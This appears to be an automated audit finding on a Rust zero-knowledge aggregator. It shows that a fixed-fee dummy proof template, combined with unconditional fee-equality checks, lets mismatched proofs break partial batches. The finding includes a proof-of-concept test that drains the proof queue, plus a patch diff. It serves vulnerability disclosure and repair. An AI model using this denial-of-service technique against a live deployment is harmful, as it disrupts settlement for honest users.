# Audited by [V12](https://v12.sh/)

The only autonomous auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.

# Fixed-fee dummy padding breaks partial private batches
**#97068**
- Severity: High
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/aggregator.rs` (2 locations)
#### Lines 284-286 — _Leaf proof admission checks only public-input length before enqueueing._

```
    fn push_proof(&mut self, proof: Proof) -> Result<()> {
        ensure_proof_public_input_len(&proof, self.expected_leaf_pi_len, "leaf proof")?;
        self.buf.push(proof)
```

⋯
#### Lines 302-318 — _Partial-batch preflight checks only `asset_id == 0` before padding._ — _Aggregation drains the buffer and checks only asset compatibility before padding._

```
        // Private-batch prover commit does padding/shuffling/dummy-nullifier-preimage handling,
        // so we can pass any non-empty batch. The wrapper's same-block / same-asset invariants are
        // intentional protocol rules and remain enforced in-circuit; this preflight only rejects
        // malformed or dummy-padding-incompatible inputs earlier.
        let proofs = self.buf.take_all();
        if proofs.len() < self.batch_size() {
            for (idx, proof) in proofs.iter().enumerate() {
                let asset_id = leaf_proof_asset_id(proof)?;
                if asset_id != 0 {
                    bail!(
                        "proof {} has asset_id={}, but private-batch dummy padding requires all real proofs to use asset_id=0",
                        idx,
                        asset_id
                    );
                }
            }
        }
```

### `wormhole/aggregator/src/private_batch/prover/lib.rs` (4 locations)
#### Lines 241-250 — _Partial private batches are padded with the fixed dummy proof template._ — _Partial batches are padded with the stored dummy proof template._

```
        // If we're going to pad with dummy proofs (asset_id = 0), ensure real proofs are asset_id=0.
        let num_dummies_needed = self.num_leaf_proofs.saturating_sub(proofs.len());
        if num_dummies_needed > 0 {
            assert_dummy_padding_asset_id_compatible(&proofs)?;
        }

        // Pad with dummy proofs
        for _ in 0..num_dummies_needed {
            proofs.push(self.dummy_proof_template.clone());
        }
```

⋯
#### Lines 259-269 — _The padded proofs are committed to the witness without fee compatibility validation._

```
        // Generate one dummy nullifier preimage per slot.
        // In-circuit hashes these only for dummy proofs.
        let dummy_nullifier_pre_images =
            generate_dummy_nullifier_pre_images_for_slots(proofs.len());

        fill_private_batch_witness(
            &mut self.partial_witness,
            &targets,
            &proofs,
            &dummy_nullifier_pre_images,
        )?;
```

⋯
#### Lines 286-307 — _The padding compatibility preflight checks only asset ID and omits fee compatibility._

```
/// If we're padding with dummy proofs (`asset_id = 0`), real proofs must also use `asset_id = 0`
/// because the private-batch circuit enforces asset_id equality across all proofs.
fn assert_dummy_padding_asset_id_compatible(
    proofs: &[ProofWithPublicInputs<F, C, D>],
) -> Result<()> {
    for (idx, proof) in proofs.iter().enumerate() {
        ensure_proof_public_input_len(
            proof,
            crate::private_batch::circuit::constants::LEAF_PI_LEN,
            "leaf proof",
        )?;
        let real_asset_id = leaf_proof_asset_id(proof)?;

        if real_asset_id != 0 {
            bail!(
                "real proof {} has asset_id={}, but dummy proofs use asset_id=0. \
                 All proofs must have the same asset_id for aggregation when padding is required.",
                idx,
                real_asset_id
            );
        }
    }
```

⋯
#### Lines 288-310 — _padding-compatibility guard checks only asset_id, never volume_fee_bps_

```
fn assert_dummy_padding_asset_id_compatible(
    proofs: &[ProofWithPublicInputs<F, C, D>],
) -> Result<()> {
    for (idx, proof) in proofs.iter().enumerate() {
        ensure_proof_public_input_len(
            proof,
            crate::private_batch::circuit::constants::LEAF_PI_LEN,
            "leaf proof",
        )?;
        let real_asset_id = leaf_proof_asset_id(proof)?;

        if real_asset_id != 0 {
            bail!(
                "real proof {} has asset_id={}, but dummy proofs use asset_id=0. \
                 All proofs must have the same asset_id for aggregation when padding is required.",
                idx,
                real_asset_id
            );
        }
    }

    Ok(())
}
```

### `wormhole/aggregator/src/dummy_proof.rs` (2 locations)
#### Lines 54-58 — _The dummy proof generator hard-codes `DEFAULT_VOLUME_FEE_BPS` to 10._ — _DEFAULT_VOLUME_FEE_BPS hardcoded to 10_

```
const DEFAULT_SECRET: &str = "4c8587bd422e01d961acdc75e7d66f6761b7af7c9b1864a492f369c9d6724f05";
const DEFAULT_TRANSFER_COUNT: u64 = 4;
const DEFAULT_INPUT_AMOUNT: u32 = 100;
const DEFAULT_OUTPUT_AMOUNT: u32 = 0;
const DEFAULT_VOLUME_FEE_BPS: u32 = 10;
```

⋯
#### Lines 138-150 — _dummy leaf inputs stamped with the hardcoded fee_ — _Generated dummy proof public inputs carry that fixed fee value._ — _dummy proof public input volume_fee_bps set to the hardcoded constant_

```
    Ok(CircuitInputs {
        public: PublicCircuitInputs {
            asset_id: 0u32,
            output_amount_1: DEFAULT_OUTPUT_AMOUNT, // Dummy proofs output 0
            output_amount_2: 0u32,                  // No second output for dummies
            volume_fee_bps: DEFAULT_VOLUME_FEE_BPS,
            nullifier,
            exit_account_1: exit_account,
            exit_account_2: BytesDigest::default(), // No second exit account
            // Sentinel: block_hash = 0 triggers validation bypass
            block_hash: BytesDigest::try_from(DUMMY_BLOCK_HASH)?,
            block_number: DEFAULT_BLOCK_NUMBER,
        },
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs` (2 locations)
#### Lines 155-159 — _The circuit chooses the fee reference from a positional slot that may be dummy after shuffling._

```
    // asset_id / volume_fee_bps refs come from slot 0. This is positionally safe because
    // equality is enforced across ALL slots (dummies included) below.
    let asset_ref = limb1_at_offset::<LEAF_PI_LEN, ASSET_ID_START>(leaf_pi_targets[0], 0);
    let volume_fee_bps_ref =
        limb1_at_offset::<LEAF_PI_LEN, VOLUME_FEE_BPS_START>(leaf_pi_targets[0], 0);
```

⋯
#### Lines 220-234 — _volume_fee_bps equality connected unconditionally for every slot (line 233), unlike the is_dummy-gated block relation (line 224)_ — _Every proof slot, including dummy padding, is constrained to equal the selected fee reference._ — _The private-batch circuit enforces asset and fee equality across all slots without dummy exemption._

```
    for (i, pis_i) in leaf_pi_targets.iter().take(n_leaf).enumerate() {
        let matches_ref = bytes_digest_eq(builder, block_hashes[i], block_ref);

        // Enforce `is_dummy_i OR matches_ref == true`
        let valid_block_relation = builder.or(is_dummy_flags[i], matches_ref);
        builder.connect(valid_block_relation.target, one);

        // Enforce asset_id consistency
        let asset_i = limb1_at_offset::<LEAF_PI_LEN, ASSET_ID_START>(pis_i, 0);
        builder.connect(asset_i, asset_ref);

        // Enforce volume_fee_bps consistency
        let volume_fee_bps_i = limb1_at_offset::<LEAF_PI_LEN, VOLUME_FEE_BPS_START>(pis_i, 0);
        builder.connect(volume_fee_bps_i, volume_fee_bps_ref);
    }
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs`
#### Lines 248-251 — _public-batch fee check is is_dummy-gated, contrasting with the private-batch unconditional enforcement_

```
        let fee_matches =
            builder.is_equal(pis_i[pbc::PRIVATE_BATCH_VOLUME_FEE_BPS_OFFSET], fee_ref);
        let fee_ok = builder.or(is_dummy_flags[i], fee_matches);
        builder.connect(fee_ok.target, one);
```

### `wormhole/circuit/src/zk_merkle_proof.rs` (3 locations)
#### Lines 80-83 — _The leaf proof registers `volume_fee_bps` as a public input alongside asset and output amounts._

```
        let asset_id = builder.add_virtual_public_input();
        let output_amount_1 = builder.add_virtual_public_input();
        let output_amount_2 = builder.add_virtual_public_input();
        let volume_fee_bps = builder.add_virtual_public_input();
```

⋯
#### Lines 409-417 — _The fee relation and fee upper-bound check are enforced unconditionally, including for dummy leaves._

```
        // Fee constraint: (output_1 + output_2) * 10000 <= input * (10000 - fee_bps)
        let ten_thousand = builder.constant(F::from_canonical_u32(10000));
        let total_output = builder.add(targets.leaf.output_amount_1, targets.leaf.output_amount_2);
        let lhs = builder.mul(total_output, ten_thousand);
        let fee_complement = builder.sub(ten_thousand, targets.leaf.volume_fee_bps);
        builder.range_check(fee_complement, 14); // fee_bps <= 10000
        let rhs = builder.mul(targets.leaf.input_amount, fee_complement);
        let diff = builder.sub(rhs, lhs);
        builder.range_check(diff, 48); // ensures lhs <= rhs
```

⋯
#### Lines 538-543 — _The dummy flag only gates the final Merkle root equality, not the fee public input._

```
        // Verify final hash equals expected root (only for non-dummy proofs)
        for i in 0..HASH_NUM_FELTS {
            let diff = builder.sub(current_hash.elements[i], targets.root_hash.elements[i]);
            let result = builder.mul(diff, targets.is_not_dummy.target);
            builder.connect(result, zero);
        }
```

## Description

Partial private-batch padding relies on a reusable dummy leaf proof whose `volume_fee_bps` is hard-coded to `10`, but the private-batch circuit still treats `volume_fee_bps` as a live public input and enforces equality with the reference value across every slot. The aggregation path only preflights dummy compatibility on `asset_id`, then drains buffered proofs and appends clones of the fixed dummy template when the batch is not full. As a result, any otherwise valid real proof with `asset_id = 0` but a different fee can enter the buffer and only fail later when the padded witness hits the unconditional `volume_fee_bps_i == volume_fee_bps_ref` constraint. This same flaw also means partial aggregation breaks whenever the runtime protocol fee differs from the compile-time dummy fee, even for honest traffic. The contrast with other dummy-gated checks shows the issue is not that dummies exist, but that fee handling was never made dummy-aware or batch-parameterized.

## Root cause

Dummy padding uses a fixed-fee `dummy_proof_template` while the private-batch circuit enforces unconditional `volume_fee_bps` equality across all slots and the padding preflight validates only `asset_id`.

## Impact

An attacker can repeatedly submit fee-mismatched but otherwise valid proofs to poison partial aggregation attempts, causing proving failures after legitimate buffered proofs have already been consumed from the queue. Independently, any deployment that sets the runtime fee away from `10` can no longer settle underfilled private batches until operators rebuild matching dummy proofs, filter by fee, or wait for full batches with no padding.

## Proof of concept

### Test case

```
use circuit_builder::generate_all_circuit_binaries;
use plonky2::plonk::proof::ProofWithPublicInputs;
use qp_wormhole_inputs::PublicCircuitInputs;
use std::path::Path;
use std::sync::Once;
use test_helpers::TestInputs;
use wormhole_aggregator::aggregator::{AggregationBackend, PrivateBatchAggregator};
use wormhole_circuit::block_header::header::HeaderInputs;
use wormhole_circuit::inputs::{CircuitInputs, ParsePublicInputs};
use wormhole_prover::WormholeProver;
use zk_circuits_common::circuit::{C, D, F};
use zk_circuits_common::utils::BytesDigest;

const TEST_OUTPUT_DIR: &str = "tmp-test-bins-poc";

static TEST_INIT: Once = Once::new();

extern "C" fn cleanup_test_output_dir() {
    let _ = std::fs::remove_dir_all(TEST_OUTPUT_DIR);
}

fn setup_test_binaries() {
    TEST_INIT.call_once(|| {
        generate_all_circuit_binaries(TEST_OUTPUT_DIR, true, 2, None)
            .expect("failed to generate test circuit binaries");

        unsafe {
            let _ = libc::atexit(cleanup_test_output_dir);
        }
    });
}

fn make_leaf_proof(inputs: &CircuitInputs) -> ProofWithPublicInputs<F, C, D> {
    setup_test_binaries();

    let prover_path = format!("{}/prover.bin", TEST_OUTPUT_DIR);
    let common_path = format!("{}/common.bin", TEST_OUTPUT_DIR);
    let prover = WormholeProver::new_from_files(Path::new(&prover_path), Path::new(&common_path))
        .expect("failed to create prover from binaries");

    prover.commit(inputs).unwrap().prove().unwrap()
}

fn make_aggregator() -> PrivateBatchAggregator {
    setup_test_binaries();
    PrivateBatchAggregator::new(TEST_OUTPUT_DIR).unwrap()
}

fn make_real_fee_variant_inputs(volume_fee_bps: u32) -> CircuitInputs {
    let mut inputs = CircuitInputs::test_inputs_0();
    inputs.public.output_amount_1 = 99;
    inputs.public.output_amount_2 = 0;
    inputs.public.volume_fee_bps = volume_fee_bps;

    let header = HeaderInputs::new(
        inputs.private.parent_hash,
        inputs.public.block_number,
        inputs.private.state_root,
        inputs.private.extrinsics_root,
        inputs.private.zk_tree_root.try_into().unwrap(),
        &inputs.private.digest,
    )
    .expect("header inputs should be valid");
    inputs.public.block_hash = header.block_hash();

    inputs
}

#[test]
fn poc_partial_private_batch_padding_fixed_fee_breaks_nondefault_fee_and_drains_buffer() {
    setup_test_binaries();

    let default_fee_proof = make_leaf_proof(&make_real_fee_variant_inputs(10));
    let nondefault_fee_proof = make_leaf_proof(&make_real_fee_variant_inputs(11));

    let default_pi = PublicCircuitInputs::try_from_proof(&default_fee_proof).unwrap();
    let nondefault_pi = PublicCircuitInputs::try_from_proof(&nondefault_fee_proof).unwrap();

    assert_eq!(default_pi.asset_id, 0, "padding path requires native-asset proofs");
    assert_eq!(nondefault_pi.asset_id, default_pi.asset_id);
    assert_eq!(nondefault_pi.output_amount_2, 0);
    assert!(nondefault_pi.output_amount_1 > 0, "proof must be non-dummy");
    assert_ne!(nondefault_pi.block_hash, BytesDigest::default(), "proof must be non-dummy");
    assert_eq!(default_pi.volume_fee_bps, 10);
    assert_eq!(nondefault_pi.volume_fee_bps, 11);

    let mut full_batch = make_aggregator();
    full_batch.push_proof(nondefault_fee_proof.clone()).unwrap();
    full_batch.push_proof(nondefault_fee_proof.clone()).unwrap();
    let full_batch_proof = full_batch
        .aggregate()
        .expect("same-fee non-default proofs should aggregate when no padding is required");
    full_batch.verify(full_batch_proof).unwrap();

    let mut partial_ok = make_aggregator();
    partial_ok.push_proof(default_fee_proof.clone()).unwrap();
    let partial_ok_proof = partial_ok
        .aggregate()
        .expect("partial batches should succeed when the real proof fee matches the dummy fee");
    partial_ok.verify(partial_ok_proof).unwrap();

    let mut poisoned_partial = make_aggregator();
    poisoned_partial
        .push_proof(nondefault_fee_proof.clone())
        .unwrap();
    assert_eq!(poisoned_partial.buffer_len(), 1, "proof is accepted into the queue");

    let err = poisoned_partial.aggregate().expect_err(
        "partial aggregation should fail because padding injects a fee=10 dummy into a fee=11 batch",
    );
    let err_text = err.to_string();
    assert!(
        err_text.contains("private-batch proving failed")
            || err_text.contains("failed to commit leaf proofs")
            || err_text.contains("Partition containing Wire")
            || err_text.contains("was set twice with different values"),
        "unexpected aggregation failure: {err_text}"
    );

    assert_eq!(
        poisoned_partial.buffer_len(),
        0,
        "aggregate() drains the buffered proof before the proving failure surfaces"
    );
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc -- --nocapture
```

### Output

```
[output truncated: 47 lines & 1.9609375 KB skipped]

</test-stdout>

<test-stderr>
    Blocking waiting for file lock on package cache
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.31s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

The PoC demonstrates the aggregation-DoS path and queue draining through `PrivateBatchAggregator::push_proof`/`aggregate` with real leaf proofs and generated circuit binaries, but it does not simulate an external long-lived service queue or repeated multi-user poisoning beyond a single failed aggregation attempt. The observed proving error string is backend-dependent, so the test asserts the failure condition and post-failure buffer loss rather than one exact internal Plonky2 message.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Updated the private-batch circuit to choose `volume_fee_bps` from the first non-dummy proof, matching the existing first-real reference selection pattern used for block data, and gated fee-equality checks so only real proofs must share that fee. This removes the fixed dummy-fee constraint from partial padding while preserving same-fee enforcement across real proofs.

### Patch

```diff
diff --git a/wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs b/wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs
--- a/wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs
+++ b/wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs
@@ -1,1713 +1,1725 @@
 //! Monolithic prebuilt Private-batch aggregation circuit.
 //!
 //! This circuit verifies `N` leaf wormhole proofs directly (without first building a
 //! dynamic merge circuit), then applies the wormhole-specific wrapper logic:
 //! - enforce block consistency across real proofs
 //! - enforce asset_id / volume_fee_bps consistency
 //! - dedupe exit accounts and sum output amounts (2 outputs per proof)
 //! - replace dummy nullifiers with hashes of externally provided random preimages
 //! - emit fixed-format aggregated public inputs
 //!
 //! The leaf verifier key is baked in as constants at circuit build time to prevent
 //! verifier key substitution attacks.
 
 use plonky2::{
     field::types::Field,
     hash::poseidon2::Poseidon2Hash,
     iop::target::{BoolTarget, Target},
     plonk::{
         circuit_builder::CircuitBuilder,
         circuit_data::{
             CircuitConfig, CircuitData, CommonCircuitData, ProverCircuitData, VerifierCircuitData,
             VerifierOnlyCircuitData,
         },
         proof::ProofWithPublicInputsTarget,
     },
 };
 
 use zk_circuits_common::{
     circuit::{C, D, F},
     gadgets::{bytes_digest_eq, limb1_at_offset, limbs4_at_offset},
 };
 
 use crate::common::recursive::add_recursive_verifiers;
 
 use super::constants::{
     aggregated_output, ASSET_ID_START, BLOCK_HASH_START, BLOCK_NUMBER_START, EXIT_1_START,
     EXIT_2_START, LEAF_PI_LEN, NULLIFIER_START, OUTPUT_AMOUNT_1_START, OUTPUT_AMOUNT_2_START,
     VOLUME_FEE_BPS_START,
 };
 
 /// Runtime targets for the prebuilt private-batch aggregation circuit.
 #[derive(Debug, Clone)]
 pub struct PrivateBatchCircuitTargets {
     /// One proof target per leaf slot.
     pub leaf_proofs: Vec<ProofWithPublicInputsTarget<D>>,
     /// One dummy-nullifier preimage target (4 felts) per leaf slot.
     pub dummy_nullifier_pre_images: Vec<[Target; 4]>,
 }
 
 pub struct PrivateBatchCircuit {
     builder: CircuitBuilder<F, D>,
     targets: PrivateBatchCircuitTargets,
 }
 
 impl PrivateBatchCircuit {
     /// Build a monolithic private-batch aggregation circuit that verifies `n_leaf` wormhole leaf proofs.
     ///
     /// The `leaf_verifier_only` is baked in as constants to prevent verifier key substitution.
     pub fn new(
         config: CircuitConfig,
         leaf_common: &CommonCircuitData<F, D>,
         leaf_verifier_only: &VerifierOnlyCircuitData<C, D>,
         n_leaf: usize,
     ) -> Self {
         assert!(n_leaf > 0, "n_leaf must be > 0");
 
         let mut builder = CircuitBuilder::<F, D>::new(config);
 
         let leaf_proofs = add_recursive_verifiers::<F, C, D>(
             &mut builder,
             leaf_common,
             leaf_verifier_only,
             n_leaf,
         );
 
         // Allocate one dummy-nullifier preimage target (4 felts) per slot.
         let mut dummy_nullifier_pre_images = Vec::with_capacity(n_leaf);
         for _ in 0..n_leaf {
             dummy_nullifier_pre_images.push([
                 builder.add_virtual_target(),
                 builder.add_virtual_target(),
                 builder.add_virtual_target(),
                 builder.add_virtual_target(),
             ]);
         }
 
         let targets = PrivateBatchCircuitTargets {
             leaf_proofs,
             dummy_nullifier_pre_images,
         };
 
         // Build the wormhole-specific wrapper logic directly in this circuit.
         build_private_batch_constraints(&mut builder, &targets, n_leaf);
 
         Self { builder, targets }
     }
 
     pub fn targets(&self) -> PrivateBatchCircuitTargets {
         self.targets.clone()
     }
 
     pub fn build_circuit(self) -> CircuitData<F, C, D> {
         self.builder.build()
     }
 
     pub fn build_prover(self) -> ProverCircuitData<F, C, D> {
         self.builder.build_prover()
     }
 
     pub fn build_verifier(self) -> VerifierCircuitData<F, C, D> {
         self.builder.build_verifier()
     }
 
     /// Build circuit with profiling output. Prints gate counts before building.
     #[cfg(feature = "profile")]
     pub fn build_circuit_profiled(self) -> CircuitData<F, C, D> {
         println!("\n=== Private-batch Gate Instance Counts ===");
         self.builder.print_gate_counts(0);
         self.builder.build()
     }
 
     /// Returns the current number of gates in the circuit (before building).
     pub fn num_gates(&self) -> usize {
         self.builder.num_gates()
     }
 }
 
 fn build_private_batch_constraints(
     builder: &mut CircuitBuilder<F, D>,
     targets: &PrivateBatchCircuitTargets,
     n_leaf: usize,
 ) {
     let one = builder.one();
     let zero = builder.zero();
 
     // We work over the leaf proofs' public inputs directly.
     //
     // `leaf_pi_targets[i]` is the PI vector of proof i, length = LEAF_PI_LEN.
     let leaf_pi_targets: Vec<&[Target]> = targets
         .leaf_proofs
         .iter()
         .map(|p| p.public_inputs.as_slice())
         .collect();
 
     // Sanity check (debug assertion): all proof target PI lengths should match expected leaf PI len.
     debug_assert!(leaf_pi_targets.iter().all(|pis| pis.len() == LEAF_PI_LEN));
 
     // =========================================================================
     // Header / reference values
     // =========================================================================
 
     // Output: [num_exit_slots, asset_id, volume_fee_bps, block_hash(4), block_number, ...]
     let num_exit_slots_t = builder.constant(F::from_canonical_u64((n_leaf * 2) as u64));
 
-    // asset_id / volume_fee_bps refs come from slot 0. This is positionally safe because
-    // equality is enforced across ALL slots (dummies included) below.
+    // `asset_id` must match across every slot, including dummies. This keeps the historical
+    // partial-batch rule that dummy padding is only compatible with native-asset (`asset_id = 0`)
+    // proofs, which the prover/wrapper preflight enforces before padding.
     let asset_ref = limb1_at_offset::<LEAF_PI_LEN, ASSET_ID_START>(leaf_pi_targets[0], 0);
-    let volume_fee_bps_ref =
-        limb1_at_offset::<LEAF_PI_LEN, VOLUME_FEE_BPS_START>(leaf_pi_targets[0], 0);
 
     // Dummy sentinel at the wrapper level is `block_hash == [0;4]`.
     // Leaf circuit itself uses a stronger dummy condition (block_hash==0 && outputs==0).
     // Here we only need the block-hash sentinel for wrapper behavior.
     let dummy_sentinel = [zero, zero, zero, zero];
 
     // Compute dummy flags for every slot up front. Also kept for the nullifier section.
     let mut is_dummy_flags: Vec<BoolTarget> = Vec::with_capacity(n_leaf);
     let mut block_hashes: Vec<[Target; 4]> = Vec::with_capacity(n_leaf);
     for pis_i in leaf_pi_targets.iter().take(n_leaf) {
         let block_i = limbs4_at_offset::<LEAF_PI_LEN, BLOCK_HASH_START>(pis_i, 0);
         let is_dummy_i = bytes_digest_eq(builder, block_i, dummy_sentinel);
         is_dummy_flags.push(is_dummy_i);
         block_hashes.push(block_i);
     }
 
-    // Select the reference block hash / block number from the FIRST NON-DUMMY slot via a
+    // Select the reference block hash / block number / fee from the FIRST NON-DUMMY slot via a
     // prefix scan. This makes the circuit position-independent: the prover may place real
     // and dummy proofs in any order (uniform shuffle), which is required for the privacy
     // argument that real and dummy slots are indistinguishable.
     //
     // If every slot is a dummy, the references remain zero, which the on-chain verifier
     // rejects as a block reference (and an all-dummy batch settles nothing anyway).
     let mut found_real = builder._false();
     let mut block_ref = [zero, zero, zero, zero];
     let mut block_number_ref = zero;
+    let mut volume_fee_bps_ref = zero;
     for i in 0..n_leaf {
         let is_real_i = builder.not(is_dummy_flags[i]);
         let not_found_yet = builder.not(found_real);
         let take_i = builder.and(is_real_i, not_found_yet);
+        let pis_i = leaf_pi_targets[i];
 
         for j in 0..4 {
             block_ref[j] = builder.select(take_i, block_hashes[i][j], block_ref[j]);
         }
-        let block_number_i =
-            limb1_at_offset::<LEAF_PI_LEN, BLOCK_NUMBER_START>(leaf_pi_targets[i], 0);
-        block_number_ref = builder.select(take_i, block_number_i, block_number_ref);
+        block_number_ref = builder.select(
+            take_i,
+            pis_i[BLOCK_NUMBER_START],
+            block_number_ref,
+        );
+        volume_fee_bps_ref = builder.select(
+            take_i,
+            pis_i[VOLUME_FEE_BPS_START],
+            volume_fee_bps_ref,
+        );
 
         found_real = builder.or(found_real, is_real_i);
     }
 
     let mut output_pis: Vec<Target> = Vec::new();
     output_pis.push(num_exit_slots_t);
     output_pis.push(asset_ref);
     output_pis.push(volume_fee_bps_ref);
 
     // =========================================================================
     // Block consistency + asset consistency + volume_fee_bps consistency
     // =========================================================================
     //
     // Constraint for each proof i:
     //   is_dummy_i OR (block_i == block_ref)
     //
     // Since block_ref is the first non-dummy slot's block hash, this forces every real
     // proof to share that same block, regardless of slot order.
     //
     // Also enforce:
     //   asset_id_i == asset_ref
-    //   volume_fee_bps_i == volume_fee_bps_ref
+    //   is_dummy_i OR (volume_fee_bps_i == volume_fee_bps_ref)
 
     for (i, pis_i) in leaf_pi_targets.iter().take(n_leaf).enumerate() {
         let matches_ref = bytes_digest_eq(builder, block_hashes[i], block_ref);
 
         // Enforce `is_dummy_i OR matches_ref == true`
         let valid_block_relation = builder.or(is_dummy_flags[i], matches_ref);
         builder.connect(valid_block_relation.target, one);
 
         // Enforce asset_id consistency
         let asset_i = limb1_at_offset::<LEAF_PI_LEN, ASSET_ID_START>(pis_i, 0);
         builder.connect(asset_i, asset_ref);
 
-        // Enforce volume_fee_bps consistency
         let volume_fee_bps_i = limb1_at_offset::<LEAF_PI_LEN, VOLUME_FEE_BPS_START>(pis_i, 0);
-        builder.connect(volume_fee_bps_i, volume_fee_bps_ref);
+
+        // Enforce volume_fee_bps consistency across real proofs only; dummy slots use a fixed
+        // reusable template fee and must not constrain padded partial batches.
+        let fee_matches_ref = builder.is_equal(volume_fee_bps_i, volume_fee_bps_ref);
+        let valid_fee_relation = builder.or(is_dummy_flags[i], fee_matches_ref);
+        builder.connect(valid_fee_relation.target, one);
     }
 
     // Output block reference (all-dummy case yields zeros, which is fine)
     output_pis.extend_from_slice(&block_ref);
     output_pis.push(block_number_ref);
 
     // =========================================================================
     // Exit-account grouping / dedup (Bitcoin-style 2-output leaves)
     // =========================================================================
     //
     // For each of 2*N slots, we:
     // 1) take that slot's exit account as the "key"
     // 2) sum all matching amounts across all 2*N outputs
     // 3) if this exit already appeared in an earlier slot, zero out the slot
     //
     // This makes duplicates indistinguishable from dummy/unused slots in output.
 
     let num_exit_slots = n_leaf * 2;
 
     let get_exit_and_amount = |proof_idx: usize, output_idx: usize| -> ([Target; 4], Target) {
         let pis = leaf_pi_targets[proof_idx];
 
         let exit = if output_idx == 0 {
             limbs4_at_offset::<LEAF_PI_LEN, EXIT_1_START>(pis, 0)
         } else {
             limbs4_at_offset::<LEAF_PI_LEN, EXIT_2_START>(pis, 0)
         };
 
         let amount = if output_idx == 0 {
             limb1_at_offset::<LEAF_PI_LEN, OUTPUT_AMOUNT_1_START>(pis, 0)
         } else {
             limb1_at_offset::<LEAF_PI_LEN, OUTPUT_AMOUNT_2_START>(pis, 0)
         };
 
         (exit, amount)
     };
 
     for slot in 0..num_exit_slots {
         let proof_idx = slot / 2;
         let output_idx = slot % 2;
         let (exit_slot, _amount_slot) = get_exit_and_amount(proof_idx, output_idx);
 
         // Check whether this exit appeared earlier (for dedupe)
         let mut is_duplicate = builder._false();
         for earlier in 0..slot {
             let earlier_proof_idx = earlier / 2;
             let earlier_output_idx = earlier % 2;
             let (exit_earlier, _) = get_exit_and_amount(earlier_proof_idx, earlier_output_idx);
 
             let matches_earlier = bytes_digest_eq(builder, exit_earlier, exit_slot);
             is_duplicate = builder.or(is_duplicate, matches_earlier);
         }
 
         // Sum all matching amounts across all 2*N outputs
         let mut acc = zero;
         for j in 0..num_exit_slots {
             let j_proof_idx = j / 2;
             let j_output_idx = j % 2;
             let (exit_j, amount_j) = get_exit_and_amount(j_proof_idx, j_output_idx);
 
             let matches = bytes_digest_eq(builder, exit_j, exit_slot);
             let conditional_amount = builder.select(matches, amount_j, zero);
             acc = builder.add(acc, conditional_amount);
         }
 
         // Zero duplicates so they look like dummy/unused slots
         let final_sum = builder.select(is_duplicate, zero, acc);
         let final_exit = [
             builder.select(is_duplicate, zero, exit_slot[0]),
             builder.select(is_duplicate, zero, exit_slot[1]),
             builder.select(is_duplicate, zero, exit_slot[2]),
             builder.select(is_duplicate, zero, exit_slot[3]),
         ];
 
         // Range check final sum to 32 bits (u32::MAX > the max possible sum on our chain)
         builder.range_check(final_sum, 32);
 
         output_pis.push(final_sum);
         output_pis.extend_from_slice(&final_exit);
     }
 
     // =========================================================================
     // Nullifiers (replace dummies with hashes of provided random preimages)
     // =========================================================================
 
     for i in 0..n_leaf {
         let pis_i = leaf_pi_targets[i];
         let real_null_i = limbs4_at_offset::<LEAF_PI_LEN, NULLIFIER_START>(pis_i, 0);
         let dummy_null_i =
             hash_dummy_nullifier_pre_image(builder, targets.dummy_nullifier_pre_images[i]);
         let is_dummy_i = is_dummy_flags[i];
 
         // output = is_dummy ? hash(dummy_nullifier_pre_image[i]) : real_nullifier[i]
         output_pis.extend_from_slice(&[
             builder.select(is_dummy_i, dummy_null_i[0], real_null_i[0]),
             builder.select(is_dummy_i, dummy_null_i[1], real_null_i[1]),
             builder.select(is_dummy_i, dummy_null_i[2], real_null_i[2]),
             builder.select(is_dummy_i, dummy_null_i[3], real_null_i[3]),
         ]);
     }
 
     // =========================================================================
     // Padding
     // =========================================================================
     //
     // Preserve the historical wrapper output sizing:
     // total length = N * LEAF_PI_LEN + 8
     let expected_len = aggregated_output::pi_len(n_leaf);
     assert!(
         output_pis.len() <= expected_len,
         "private-batch output PI length {} exceeds expected {}",
         output_pis.len(),
         expected_len
     );
 
     while output_pis.len() < expected_len {
         output_pis.push(zero);
     }
 
     // Register final public inputs
     builder.register_public_inputs(&output_pis);
 
     // Optional sanity checks on header offsets
     debug_assert_eq!(aggregated_output::NUM_EXIT_SLOTS_OFFSET, 0);
     debug_assert_eq!(aggregated_output::ASSET_ID_OFFSET, 1);
     debug_assert_eq!(aggregated_output::VOLUME_FEE_BPS_OFFSET, 2);
     debug_assert_eq!(aggregated_output::BLOCK_HASH_OFFSET, 3);
     debug_assert_eq!(aggregated_output::BLOCK_NUMBER_OFFSET, 7);
 }
 
 fn hash_dummy_nullifier_pre_image(
     builder: &mut CircuitBuilder<F, D>,
     pre_image: [Target; 4],
 ) -> [Target; 4] {
     let inner_hash = builder.hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(pre_image.to_vec());
     builder
         .hash_n_to_hash_no_pad_p2::<Poseidon2Hash>(inner_hash.elements.to_vec())
         .elements
 }
 
 #[cfg(test)]
 mod tests {
     use std::collections::BTreeMap;
 
     use anyhow::Result;
     use plonky2::field::types::{Field, PrimeField64};
     use plonky2::{
         hash::poseidon2::Poseidon2Hash,
         iop::{
             target::Target,
             witness::{PartialWitness, WitnessWrite},
         },
         plonk::{
             circuit_builder::CircuitBuilder,
             circuit_data::{
                 CircuitConfig, CircuitData, CommonCircuitData, VerifierCircuitData,
                 VerifierOnlyCircuitData,
             },
             config::Hasher,
             proof::ProofWithPublicInputs,
         },
     };
     use rand::rngs::StdRng;
     use rand::{Rng, SeedableRng};
 
     use zk_circuits_common::circuit::{wormhole_private_batch_circuit_config, C, D, F};
 
     use crate::private_batch::{
         circuit::{
